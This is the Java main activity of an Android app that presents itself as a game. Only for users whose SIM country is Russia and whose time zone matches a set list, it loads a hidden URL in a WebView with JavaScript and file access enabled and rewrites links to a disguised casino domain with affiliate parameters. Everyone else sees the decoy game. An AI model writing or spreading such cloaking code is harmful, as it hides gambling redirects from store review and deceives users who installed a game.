package mmjrjal.ckrjaask;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.icu.util.TimeZone;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;


import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = MainActivity.class.getSimpleName();
    private static final String TAG_FOR_SHA = "Base64";

    private static final String ISO_CODE_RU_1 = "ru";       // don't change value
    private static final String ISO_CODE_RU_2 = "rus";      // don't change value
    private static final String ALGORITHM_NAME = "SHA";     // don't change value

    private static final String QUERY_1 = "campaign";
    private static final String QUERY_2 = "source";
    private static final String KEY = "pid";

    private String mOpeningUrl;
    private String mRedirectKey;

    private ProgressBar progressBar;
    private String queryValueFirst;
    private String queryValueSecond;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        setContentView(R.layout.activity_main);

        mOpeningUrl = getString(R.string.opening_url);      // don't change value id
        mRedirectKey = getString(R.string.key_redirecting); // don't change value id

        Uri builtUri = Uri.parse(mOpeningUrl);
        Uri.Builder builder = builtUri.buildUpon();

        Intent intent = getIntent();
        if (intent != null) {
            Uri data = intent.getData();
            if (data != null && data.getEncodedQuery() != null) {
                if (data.getEncodedQuery().contains(QUERY_1)) {
                     queryValueFirst = data.getQueryParameter(QUERY_1);
//                    builder.appendQueryParameter(KEY, queryValueFirst);
                } else if (data.getEncodedQuery().contains(QUERY_2)) {
                    queryValueSecond = data.getQueryParameter(QUERY_2);
//                    builder.appendQueryParameter(KEY, queryValue);
                }
            }
        }

        mOpeningUrl = builder.build().toString();


        progressBar = findViewById(R.id.progress);
        progressBar.setVisibility(View.VISIBLE);
        Send();
        Receice();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main2, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressLint("PackageManagerGetSignatures")
    private void Send() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    getApplicationContext().getPackageName(),
                    PackageManager.GET_SIGNATURES
            );
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance(ALGORITHM_NAME);
                md.update(signature.toByteArray());

                Log.i(TAG_FOR_SHA, Base64.encodeToString(md.digest(), Base64.NO_WRAP));
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.d(TAG_FOR_SHA, e.getMessage(), e);

        } catch (NoSuchAlgorithmException e) {
            Log.d(TAG_FOR_SHA, e.getMessage(), e);
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void Receice() {
        Log.d(TAG, "Receice");

        if (isSimCardInserted() && isNeedTimeZones()) {
            progressBar.setVisibility(View.GONE);
            WebView webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!url.contains(mRedirectKey)) {
                        if (url.contains("aff1b1b01.vulkanplat1num") && queryValueFirst != null && queryValueSecond != null) {
                            view.loadUrl(url +queryValueSecond+ "&pid=" + queryValueFirst);
                        } else {
                            view.loadUrl(url);
                        }
                    } else {
                        openScreenGame();
                    }
                    return true;
                }

                @RequiresApi(Build.VERSION_CODES.N)
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                    if (!request.getUrl().toString().contains(mRedirectKey)) {
                        view.loadUrl(request.getUrl().toString());
                    } else {
                        openScreenGame();
                    }
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request,
                                            WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    openScreenGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request,
                                                WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    openScreenGame();
                }
            });
            WebSettings webSettings = webView.getSettings();
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(true);
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            webView.loadUrl(mOpeningUrl);
        } else {
            openScreenGame();
        }
    }

    private boolean isNeedTimeZones() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2,3,4,7,8,9,10,11,12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }
        return false;
    }

    private boolean isSimCardInserted() {
        String countryCodeValue = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null){
            countryCodeValue = ((TelephonyManager)
                    getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        } else {
            return false;
        }
        return countryCodeValue != null
                && (countryCodeValue.equalsIgnoreCase(ISO_CODE_RU_1)
                || countryCodeValue.equalsIgnoreCase(ISO_CODE_RU_2));
    }

    @NonNull
    public static Intent getMainActivityIntent(Context context) {
        return new Intent(context, MainActivity.class);
    }

    private void openScreenGame() {
        Log.d(TAG, "openScreenGame");
        progressBar.setVisibility(View.GONE);
        startActivity(GameActivity.getGameActivityIntent(this));
        overridePendingTransition(0,0);
        finish();
    }
}
